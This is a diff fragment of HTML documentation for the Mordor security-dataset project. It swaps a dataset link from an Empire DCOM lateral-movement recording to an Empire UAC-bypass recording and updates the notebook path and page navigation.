-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_dcom.tar.gz&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/privilege_escalation/empire_uac_shellapi_fodhelper.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
@@ -942,7 +973,7 @@
         },
         kernelOptions: {
             kernelName: "pyspark3",
-            path: "./notebooks/small/windows/02_execution"
+            path: "./notebooks/small/windows/04_privilege_escalation"
         },
         predefinedOutput: true
     }
@@ -957,8 +988,8 @@
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="SDWIN-190518214442.html" title="previous page">Empire Invoke WMI</a>
-    <a class='right-next' id="next-link" href="SDWIN-190518231333.html" title="next page">WMIC Add User Backdoor</a>
+    <a class='left-prev' id="prev-link" href="privilege_escalation.html" title="previous page">Privilege Escalation</a>
+    <a class='right-next' id="next-link" href="SDWIN-190518204300.html" title="next page">Empire Invoke Runas</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
